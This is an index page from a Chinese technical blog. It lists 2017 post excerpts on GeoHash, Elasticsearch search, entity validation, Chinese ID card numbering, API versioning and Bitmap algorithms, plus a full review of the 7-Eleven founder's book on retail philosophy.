  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/08/geohash/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/geohash/" itemprop="url">GeoHash核心原理解析</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-22T11:37:35+00:00">
                2017-08-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index">
                    <span itemprop="name">算法</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <blockquote>
<p>原文：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/LBSer/p/3310455.html">GeoHash核心原理解析</a></p>
</blockquote>
<p>机机是个好动又好学的孩子，某一天机机到北海公园游玩，肚肚饿了于是打开手机地图，搜索北海公园附近的餐馆，并选了其中一家用餐。饭饱之后机机开始反思了，地图如何根据自己所在位置查询来查询附近餐馆的呢？</p>
<p><img src="//www.fanhaobai.com/2017/08/geohash/848ae91e-8403-45ef-8cd4-c63c9bdf99fd.jpg">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/08/geohash/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/08/elasticsearch-advanced-search/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/elasticsearch-advanced-search/" itemprop="url">Elasticsearch检索 — 聚合和LBS</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-21T14:42:43+00:00">
                2017-08-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Lucene/" itemprop="url" rel="index">
                    <span itemprop="name">Lucene</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>文章 <a target="_blank" rel="noopener" href="https://www.fanhaobai.com/2017/08/elasticsearch-search.html">Elasticsearch检索实战</a> 已经讲述了 Elasticsearch 基本检索使用，已满足大部分检索场景，但是某些特定项目中会使用到 <a href="#">聚合</a> 和 <a href="#">LBS</a> 这类高级检索，以满足检索需求。这里将讲述 Elasticsearch 的聚合和 LBS 检索使用方法。</p>
<p><img src="//www.fanhaobai.com/2017/08/elasticsearch-advanced-search/d758139c-86ce-4472-89e8-7eb385cf7991.jpg">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/08/elasticsearch-advanced-search/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/%E5%9F%BA%E4%BA%8E%E7%89%B9%E6%80%A7(Attribute)%E7%9A%84%E5%AE%9E%E4%BD%93%E5%B1%9E%E6%80%A7%E9%AA%8C%E8%AF%81%E6%96%B9%E6%A1%88%E8%AE%BE%E8%AE%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/%E5%9F%BA%E4%BA%8E%E7%89%B9%E6%80%A7(Attribute)%E7%9A%84%E5%AE%9E%E4%BD%93%E5%B1%9E%E6%80%A7%E9%AA%8C%E8%AF%81%E6%96%B9%E6%A1%88%E8%AE%BE%E8%AE%A1/" itemprop="url">基于特性(Attribute)的实体属性验证方案设计</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-21T06:25:41+00:00">
                2017-08-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">编程语言</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          在这个例子中，bookstore节点由两个book节点组成，而每个book节点则由title、author、year和price四个节点组成，显然这些节点描述的是一种结构化的数据，而这些数据同时附加了相关描述性的信息，例如book节点有category信息，title节点有lang信息;显然，一个实体结构中将包含若干个不同的属性，所以在对一个实体结构进行验证的时候，会通过反射遍历每一个属性上的ValidationAttribute并调用其Validate()方法，所以最终返回给调用者的应该是由一组ValidationResult组成的集合，为此我们设计了ValidationResultCollection这个类，该类实现了ICollection接口，在此基础上我们增加了一个Success属性，当集合中所有ValidationResult的Success属性为true时，该属性为true反之为false;所有校验相关的Attribute都派生自ValidationAttribute这个父类，其核心方法是Validate()方法，该方法被声明为一个虚方法，因此所有的子类都必须对这个方法进行重写，它将返回一个叫做ValidationResult的结构，这是一个非常简单的数据结构，它仅仅包含Success和Message两个属性，前者表示当前校验是否成功，后者表示验证失败时的错误信息
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/%E5%9F%BA%E4%BA%8E%E7%89%B9%E6%80%A7(Attribute)%E7%9A%84%E5%AE%9E%E4%BD%93%E5%B1%9E%E6%80%A7%E9%AA%8C%E8%AF%81%E6%96%B9%E6%A1%88%E8%AE%BE%E8%AE%A1/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/08/id-card/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/id-card/" itemprop="url">身份证的编码规则</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-20T03:39:31+00:00">
                2017-08-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">语言</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/PHP/" itemprop="url" rel="index">
                    <span itemprop="name">PHP</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>在我国现行的身份证系统中共有 15 位和 18 位两种身份证号码，第一代身份证大多为 15 位号码，由于 15 位身份证只能为 1900.01.01 到 1999.12.31 出生的人编码（千年虫问题），所以后来逐步替换为 18 位的身份证号码。</p>
<p><img src="//www.fanhaobai.com/2017/08/id-card/05f73384-a9ba-4a80-8433-563331dfd896.jpg">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/08/id-card/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017-08-20-the-tao-of-711-summary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017-08-20-the-tao-of-711-summary/" itemprop="url">711 的成功之道 - 读《零售的哲学》</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-20T01:35:38+00:00">
                2017-08-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/summary/" itemprop="url" rel="index">
                    <span itemprop="name">summary</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p><img src="http://img11.360buyimg.com/n1/jfs/t826/105/1361669663/276778/2b0f7740/55a36592N2a41e456.jpg"></p>
<p>这周读完了 711 创始人铃木敏文的自述图书《零售的哲学》，分享一下我的读书心得。</p>
<p>我发现铃木敏文做生意的方法论特别简单，整本书其实讲的道理就几个，只不过反复讲。读完整个总结下来，作者想表达的就只有几点：</p>
<ol>
<li>搞明白问题的本质。</li>
<li>执行上做到极致。</li>
<li>把心理学融入到商业中。</li>
<li>主动寻求变化。</li>
<li>遵循“假设-&gt;执行-&gt;检验”的步骤来做尝试。</li>
</ol>
<p>下面我就分别总结书中的以上观点。</p>
<h2 id="搞明白问题的本质"><a href="#搞明白问题的本质" class="headerlink" title="搞明白问题的本质"></a>搞明白问题的本质</h2><p>铃木敏文从第一章开始，到最后一章结束，都在贯穿他的反对轻信常识的观点。本书的第一章叫做「一切从“打破常识”开始」,最后一章叫做「打破“常识”」。可见“常识”是多么的有误导性！在书中，铃木敏文介绍了多次他打破“常识”，发现问题本质的例子。</p>
<p>比如，在决定经营 711 便利店时，当时日本的小型商店经营得非常惨淡。普通人认为是大型超市挤压了便利店的生存空间，当时确实 711 的母公司伊藤洋化堂在大型超市上很挣钱。但是铃木敏文认为小型商店的关键问题是：1、生产效率低下 2、没有差异化的竞争点。他认为解决了这两个关键问题之后，便利店是有很大的机会的。</p>
<p>为了解决这两个关键问题，711 实施了：1、密集选址战略 2、构建产品研发与供应的基础体系 3、注重与员工的直接沟通。第1，2点解决了小型商店的生产效率问题，而第3点持续产生一线的数据和想法，有利于构建差异化的竞争方案。最终成就了 711 成为了一家全球成功的便利店。</p>
<p>在决定收购 711 原本的品牌授权方：美国的南方公司时。铃木敏文同样洞查出了南方公司失败的本质：他们没有构建出有竞争力的主营业务以及美国社会产品结构的变化。随着收购后对美国公司实施单品管理、物流配送改革等措施后，很快就有效果了。</p>
<p>铃木敏文在书中讲看清楚本质的故事很多，也讲了很多他自己的分析，但是如何能够看清本质？对于这个问题，他并没有这方面详细的方法论。书中有一些经验似乎是不太好借鉴的，比如他喜欢通过广播大量地收集信息，喜欢开会演讲。当然也有一些是可以学习的，比如他总是会亲自到 711 店里面去体验商品和购物流程。</p>
<p>我自己认为，要搞明白问题的本质需要做到 3 点：1、有效的信息获取。2、适当的讨论。3、独立的思考决策以及检验。这点有机会再展开论述。</p>
<h3 id="执行上做到极致"><a href="#执行上做到极致" class="headerlink" title="执行上做到极致"></a>执行上做到极致</h3><p>铃木敏文在书中的很多做法显示出他是一个“不计成本”的人，他经常为了一个理念，花几年时间来做一件事情。几年时间啊！一件事情从 0 到 1 得花费几年时间，对于大多数公司都是不可接受的。而他愿意坚持做这样的事情。在书中，他介绍了 711：</p>
<ul>
<li>为了采取全年无休的经营方式。花了两年，才说服山崎面包在假期供货。</li>
<li>为了在便利店中提供 ATM 取款服务，在和别的银行谈判无果的情况下，花了两年独立申请银行服务牌照。</li>
<li>为了让炒饭的口感有“大火爆炒”的传统口感，花了一年八个月的研发。</li>
<li>为了解决中国人喜欢吃热菜的习惯，同时符合中国政府食品安全要求，研发出中央厨房配制，无需明火就可以在便利店简单加热售卖的现煮食品。当然，这一方法很快被所有中国便利店「借鉴」了。</li>
</ul>
<p>我看完书后，倒不认为铃木敏文是光有匹夫之勇的人，他能够判断一件事情成功的收益巨大，所以愿意在研发阶段投入足够多的时间和人力成本。而对于大部分事情，确实也并不存在一定搞不定的情况。投入了足够多的精力，通常都可以找到一定的解法。</p>
<h3 id="把心理学融入到商业中"><a href="#把心理学融入到商业中" class="headerlink" title="把心理学融入到商业中"></a>把心理学融入到商业中</h3><p>这部分内容，铃木敏文举的最成功的例子，是让商店返还 5% 的消费税的形式，代替原本让消费者麻木的降阶促销。这两件事情看起来本质上都是降价，但是返还消费税的形式迎合了顾客的情感诉求，令他们在心理上更容易接受。</p>
<h3 id="主动寻求变化"><a href="#主动寻求变化" class="headerlink" title="主动寻求变化"></a>主动寻求变化</h3><p>因为时代不停在变化，当市场环境变化时，原本的商业形式如果不做变化，那么就可能面临失败。铃木敏文说：711 是一家不断主动做出改变的公司。他确实在不断调整经营的方案，甚至不反对“朝令夕改”。书中的第六章的标题赫然写着：经营理应“朝令夕改”。</p>
<p>由于主动寻求变化，711 做出了很多有先见之明的事情，例如推出送货上门服务，增加网络购物，针对日本的老年人提供送餐服务等。</p>
<p>主动寻求变化和刚开始说的搞明白问题的本质其实是衔接在一起的，我们在搞明白问题的本质后，不能把这件事情就归为结论了。而是应该随着时间变化，不断地反复思考当时的结论是否仍然成立。很可能市场变化了，结论也就变了。</p>
<h3 id="遵循“假设-执行-检验”的步骤来做尝试"><a href="#遵循“假设-执行-检验”的步骤来做尝试" class="headerlink" title="遵循“假设-&gt;执行-&gt;检验”的步骤来做尝试"></a>遵循“假设-&gt;执行-&gt;检验”的步骤来做尝试</h3><p>“假设-&gt;执行-检验”其实和精益创业中提到的 MVP（最小可执行产品）类似。在我们寻求变化，发现新的问题后，应该在小范围内尝试解决他。711 的很多尝试都是先在几家便利店中试行，然后再全国推广。这种最小风险的尝试，有利于公司大胆地试错。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果拿一句话来总结，711 的创始人铃木敏文的经营哲学就是：主动观察市场的变化，在搞清楚问题的本质后，做到极致的执行，在执行过程中利用 MVP 来试错，并且融入心理学知识。</p>
<p>听我总结不如自己买来翻翻，推荐给大家~ 以下是该书的思维导图。</p>
<img src="/images/711-tao-book-mindnode.png" class="">


          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/08/api-version/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/api-version/" itemprop="url">APP接口多版本处理</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-19T10:36:09+00:00">
                2017-08-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">语言</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/PHP/" itemprop="url" rel="index">
                    <span itemprop="name">PHP</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>在开发 APP 端 API 接口时，随着 APP 的版本迭代，尽管通常 APP 只需要保持 4-5 个版本可用，过老版本会强制更新，但 API 接口避免不了出现多个版本的情况，那么 API 接口的多版本问题服务端怎么解决呢？</p>
<p><img src="//www.fanhaobai.com/2017/08/api-version/114d5a46452f82018a1f0aaee82fdfab.png">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/08/api-version/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/08/bitmap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/bitmap/" itemprop="url">什么是Bitmap算法？</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-16T15:10:42+00:00">
                2017-08-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index">
                    <span itemprop="name">算法</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <blockquote>
<p>转自 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5OTA1MDUyMA==&mid=2655438893&idx=2&sn=42383086a358b718d7de569c42b5fbf8&chksm=bd73045a8a048d4c4237d362d7007889740f4b75de565325ee28aeba183380e3e03d1dce37b8&mpshare=1&scene=23&srcid=0817azlyj8TR6xsyxW0KNolG##">伯乐专栏 玻璃猫</a></p>
</blockquote>
<p>本文的灵感来源于京东金融数据部张洪雨同学的项目经历，感谢这位大神的技术分享。</p>
<p><img src="//www.fanhaobai.com/2017/08/bitmap/e897a05e-90c5-442f-8700-b07650c5bb79.png">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/08/bitmap/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/38/">&lt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/38/">38</a><span class="page-number current">39</span><a class="page-number" href="/page/40/">40</a><span class="space">&hellip;</span><a class="page-number" href="/page/74/">74</a><a class="extend next" rel="next" href="/page/40/">&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">1464</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">73</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">910</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5358884258"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Laird Lau</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
